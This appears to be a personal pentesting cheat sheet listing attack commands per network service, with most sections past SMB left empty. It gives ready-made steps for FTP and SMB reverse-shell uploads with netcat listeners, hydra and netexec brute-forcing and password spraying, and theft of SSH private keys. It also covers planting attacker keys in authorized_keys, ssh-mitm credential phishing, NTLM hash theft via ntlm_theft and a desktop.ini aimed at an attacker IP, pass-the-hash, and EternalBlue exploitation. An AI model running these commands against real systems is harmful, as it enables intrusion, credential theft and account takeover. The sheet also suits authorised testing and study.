---
layout: notes
permalink: /notes/network/services/
title: Network Services Pentesting Cheat Sheet
---



# Network Services Pentesting Cheat Sheet
<details markdown="1">
<summary>FTP (21)</summary>

```bash
#Login
ftp <IP> #optional port
lftp <IP>
anonymous:anonymous

#Commands
cd
ls -a # List all files (even hidden)
put <filename> #Upload file
get <filename> #Download file
mput/mget #Upload/Downlaod multiple files
quit

#Download all files
wget -m ftp://anonymous:anonymous@10.10.10.98
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
wget -r --user="USERNAME" --password="PASSWORD" ftp://server.com/ #If your user/password has special characters

#nmap
nmap --script ftp-* -p 21 <IP>

#metasploit
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_bounce
use auxiliary/scanner/ftp/bison_ftp_traversal
use auxiliary/scanner/ftp/colorado_ftp_traversal
use auxiliary/scanner/ftp/titanftp_xcrc_traversal

#Enum dirs
gobuster dir -u ftp://<IP> -w wordlist

#Bruteforce
hydra -l username -P passwords.txt <target-ip> ftp
hydra -L username.txt -p password <target-ip> ftp
hydra -l username -P passwords.txt ftp://<target-ip>
hydra -L usernames.txt -p password ftp://<target-ip>

#Configuration
cat /etc/vsftpd.conf
cat /etc/vsftpd/vsftpd.conf

#Reverse Shell
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
# Edit some variables in shell.php
$ip = '<your-local-ip>';
$port = 1234;
#Upload
ftp <target-ip>
# Upload the payload you downloaded
ftp> put shell.php
# Get shell
nc -lvnp 1234
http://vulnerable.com/path/to/ftp/shell.php
```
</details>

<details markdown="1">
<summary>SSH (22)</summary>

### Basic commands
```bash
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl restart ssh
sudo systemctl status ssh
ps -e | grep ssh
#Config
vim /etc/ssh/sshd_config
#Chek for any Connection
who | grep <username>
#Kill Connections
# -f: full process name to match
sudo pkill -f pts/#
# Authentication logs
grep 'sshd' /var/log/auth.log
```

### Enumeration
```bash
nmap --script ssh-brute -p 22 <target-ip>
nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 <target-ip>
nmap --script ssh-* -p 22 <target-ip>

# User enumeration
msfconsole
msf> use auxiliary/scanner/ssh/ssh_enumusers

# Banner and Audit
nc <IP> 22
ssh-audit <target-ip>
```
### Bruteforce
```bash
# -t: tasks
hydra -l username -P passwords.txt <target-ip> ssh -t 4
hydra -L usernames.txt -p password <target-ip> ssh -t 4

# Specific ports
hydra -l username -P passwords.txt -s 2222 <target-ip> ssh -t 4
hydra -l username -P passwords.txt ssh://<target-ip>:2222 -t 4

#Password spraying
hydra -L usernames-list.txt -p Spring2025 ssh://10.1.1.10
```
### Crack SSH Private Key
```bash
ssh2john private_key.txt > hash.txt
# or
python2 /usr/share/john/ssh2john.py private_key.txt > hash.txt

# Crack the password of the private key
john --wordlist=wordlist.txt hash.txt
```
### Connect
```bash
ssh username@<target-ip>
ssh username@<target-ip> -p 22

# Using private key
ssh -i id_rsa username@<target-ip>

# Without username
ssh 10.0.0.1

# Additional options
# If we got the error message "no matching host key type found. Their offer: ssh-rsa..."
ssh -o HostKeyAlgorithms=+ssh-rsa user@10.0.0.1
# If we got error "no matching key exchange method found. Their offer: diffie-hellman-..."
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@10.0.0.1

#Test connection
ssh -T username@10.0.0.1
ssh -T username@10.0.0.1 -vvv

#Command execution
ssh username@<target-ip> 'ls -l'

#Windows AD
ssh domain-name\\username@domain-controller

#Via Private Key
cat /home/<victim-user>/.ssh/id_rsa
echo 'copied content of id_rsa' > private_key.txt
chmod 600 private_key.txt
ssh -i private_key.txt victim-user@<remote-ip>
```

### Transfer files
```bash
# Send a file
scp ./example.txt user@<ip>:./example.txt\

# Send a directory
scp -r ./example user@<ip>:/home/<ip>/

# Download a file
scp user@<ip>:/home/<user>/path/to/file.txt .

# Download a directory
scp -r user@<ip>:/home/<user>/path/to/file.txt .
```
### Create SSH Keys
```bash
# Specify the output file
ssh-keygen -f key

# Specify Ed25519
ssy-keygen -t ed25519

#In target machine install ssh
ssh-copy-id username@<target-ip>
```

### Generate SSH Keys and Set Up Public Key to Connect Remote Machine
```bash
#Check if authorized_keys Exists in Remote Machine
ls /home/<remote-user>/.ssh/authorized_keys
#If it exists, you may be able to connect SSH with your keys as victim user.

#Generate SSH Keys in Local Machine
ssh-keygen -f key

#Copy the content of publick key
cat ./key.pub
#Then copy the content of public key you generated.

#Add the Content of Publick Key to authorized_keys
#In remote machine
echo '<content of id_rsa.pub' >> /home/<victim-user>/.ssh/authorized_keys

#Login with Private Key
#In local machine, we have a SSH private key in local machine so we can login the target SSH server with it.
# Change permission of the private key ('key', here)
chmod 600 key
# Login with it
ssh victim@<target-ip> -i key
```
### Stealing Credentials via MiTM
```bash
# If not have the ssh-mitm, install first.
pip3 install ssh-mitm --upgrade

# --enable-trivial-auth: The "trivial authentication" phishing attack
# --remote-host: Specify the target ip/domain
# --listen-port: Specify the ip address to listen in local machine
ssh-mitm server --enable-trivial-auth --remote-host example.com --listen-port 2222

```

</details>

<details markdown="1">
<summary>Telnet (23)</summary>

```bash

```
</details>

<details markdown="1">
<summary>SMTP (25/465/587)</summary>

```bash

```
</details>

<details markdown="1">
<summary>DNS (53)</summary>

```bash

```
</details>

<details markdown="1">
<summary>POP (110/995)</summary>

```bash

```
</details>

<details markdown="1">
<summary>Kerberos (88)</summary>

```bash

```
</details>

<details markdown="1">
<summary>SMB (139/445)</summary>

### Enumeration
```bash
#nmap
nmap --script smb-brute -p 139,445 <target-ip>
nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 139,445 <target-ip>
nmap --script smb-enum* -p 139,445 <target-ip>
nmap --script smb-protocols -p 139,445 <target-ip>
nmap --script smb-vuln* -p 139,445 <target-ip>

# NetBIOS names
nmblookup -A 10.0.0.1
nbtscan 10.0.0.1
nbtscan -r 10.0.0.1/24

# Enum4linux
enum4linux <target-ip>
# All enumeration
enum4linux -a <target-ip>
# Verbose
enum4linux -v <target-ip>
# Specify username and password
enum4linux -u username -p password <target-ip>

# Enum4linux-ng
# -A: All simple enumeration including nmblookup
enum4linux-ng -A <target-ip>
# -As: All simple short enumeration without NetBIOS names lookup
enum4linux-ng -As <target-ip>
# -u: Specific username
# -p: Specific password
enum4linux-ng -u "administrator" -p "password" <target-ip>

# NetExec (https://www.netexec.wiki/)
netexec smb 10.0.0.0/24
netexec smb <target-ip>
netexec smb <target-ip-1> <target-ip-2>
netexec smb <target-ip> --pass-pol
netexec smb <target-ip> --groups
netexec smb <target-ip> --users
# Specify username/password
netexec smb <target-ip> -u username -p password
netexec smb <target-ip> -u username -p password --users
# -M zerologon: Scan for ZeroLogon
# -M petitpotam: Scan for PetitPotam
netexec smb <target-ip> -u '' -p '' -M zerologon -M petitpotam
```
### Find Shared Folders
```bash
# -N: No password
# -L: List shared directories
smbclient -N -L <target-ip>
smbclient -L <target-ip> -U username

smbmap -H <target-ip>
# Recursive
smbmap -H <target-ip> -R
# Username and password
smbmap -u username -p password -H <target-ip>
# Execute a command
smbmap -u username -p password -H <target-ip> -x 'ipconfig'

netexec smb <target-ip> -u '' -p '' --shares
netexec smb <target-ip> -u username -p password --shares

impacket-psexec example.local/username@<target-ip>
```
### Bruteforce
```bash
netexec smb <target-ip> -u username -p passwords.txt --continue-on-success
netexec smb <target-ip> -u usernames.txt -H ntlm_hashes.txt --continue-on-success

hydra -l username -P passwords.txt <target-ip> smb
hydra -L usernames.txt -p password <target-ip> smb

# RID Brute Force
netexec smb <target-ip> -u username -p password --rid-brute 20000

# Using Metasploit
msfconsole -q
msf> use auxiliary/scanner/smb/smb_login

#If we find credentials, we can use them for smbclient or WinRM. 
#If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.
smbpasswd -r <target-ip> -U <username>
# or
impacket-smbpasswd <DOMAIN>/<username>:<password>@<target-ip> -newpass <new-password>
# If you don't have impacket-smbpasswd, download it from a repository.
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py
```

### Password Spraying
```bash
# User enumeration
netexec smb <target-ip> -u John -p Password123 --users
netexec smb <target-ip> -u John -H <NTLM_HASH> --users

# Find users with same password
netexec smb <target-ip> -u users.txt -p Password123 --continue-on-success
netexec smb <target-ip> -u users.txt -p found_passwords.txt --continue-on-success
netexec smb <target-ip> -u users.txt -H <NTLM_HASH> --continue-on-success
netexec smb <target-ip> -u users.txt -H found_ntlm_hashes.txt --continue-on-success
```

### RID Cycling Attack
RID Enumeration. It attempts to enumerate user accounts through null sessions.
```bash
# Anonymous logon
# 20000: Maximum RID to be cycled
impacket-lookupsid example.local/anonymous@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000
# Specify user
impacket-lookupsid example.local/user@<target-ip> 20000 -hashes <lmhash>:<nthash>
impacket-lookupsid example.local/user@<target-ip> 20000


# USEFUL COMMAND
# This command extract usernames. It's useful for further enumeration which uses usernames.
# Replace the following keywords:
#  - `example.com` => Target domain
#  - `10.0.0.1`    => Target IP
#  - `DOMAIN`      => Target domain name
impacket-lookupsid example.com/guest@10.0.0.1 20000 -no-pass > tmp.txt | cat tmp.txt | grep SidTypeUser | cut -d ' ' -f 2 | sed 's/DOMAIN\\//g' | sort -u > users.txt && rm tmp.txt
```

### NTLM Stealing via ntlm_tool
```bash
git clone https://github.com/Greenwolf/ntlm_theft
# -g all: Generate all files.
# -s: Local IP (attacker IP)
# -f: Folder to store generated files.
python3 ntlm_theft -g all -s <local-ip> -f samples

#After generating files with ntlm_theft put the .lnk file to shared folder
smbclient -N //10.0.0.1/example
smb> put samples.lnk

#Start responder
sudo responder -I eth0
```

### NTLM Stealing via Desktop.ini
```bash
#We can retrieve the hashes by putting desktop.ini file, that contains arbitrary icon resource path, to the shared folder.
#Create a new desktop.ini in local machine.
[.ShellClassInfo]
IconResource=\\<local-ip>\test

#Then upload it to the writable shared folder.
put desktop.ini

#Start responder
sudo responder -I eth0
```

### Connect
```bash
# anonymous login
smbclient //10.0.0.1/somedir -N
# If the folder name contains spaces, surround with double quotes
smbclient "//10.0.0.1/some dir" -N
# Specify user
smbclient //10.0.0.1/somedir -U username
# nobody, no-pass
smbclient //10.0.0.1/somedir -N -U nobody
# Specify workgroup
smbclient -L 10.0.0.1 -W WORKGROUP -U username

#Windows shell
impacket-wmiexec example.local/username@10.0.0.1
# Pass the Hash
impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
```

### Commands
```bash
ls
get file.txt
get "my document.txt"

#Download all files
mask ""
recurse ON
prompt OFF
mget *

#Download files using smbget
smbget smb://<target-ip>/somedir/example.txt -U username
smbget -R smb://<target-ip>/somedir -U username
# Specify workgroup
smbget -R smb://<target-ip>/somedir -w WORKGROUP -U username
# as anonymous user
smbget smb://<target-ip>/somedir -U anonymous
password: anonymous

#Upload files
put example.txt

#Reverse shell
put shell.aspx
#Configure listener
nc -lvnp 4444
#Access the shared file
https://example.com/path/to/smb/share/shell.aspx
```

### Eternal Blue (MS17-010)
```bash
#Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set rhosts <target-ip>
set lhost <local-ip>
run
# If you cannot get a shell with the default payloed (windows/x64/meterpreter/reverse_tcp), try to change the payload
set payload payload/generic/shell_reverse_tcp

#Automated tool (autoblue)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
python zzz_exploit.py -target-ip <target-ip> -port 445 'username:password@target'
```

</details>

<details markdown="1">
<summary>IMAP (143/993)</summary>

```bash

```
</details>

<details markdown="1">
<summary>LDAP (389/636/3268/3269)</summary>

```bash

```
</details>

<details markdown="1">
<summary>MSSQL (1433)</summary>

```bash

```
</details>

<details markdown="1">
<summary>MysQL (3306)</summary>

```bash

```
</details>

<details markdown="1">
<summary>RDP (3389)</summary>

```bash
#Password spraying
git clone https://github.com/xFreed0m/RDPassSpray
#Options:
RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
#Usage:
python3 RDPassSpray.py -U users.txt -p Spring2025! -t 10.100.10.240:3389
```
</details>

<details markdown="1">
<summary>WinRM (5985/5986)</summary>

```bash

```
</details>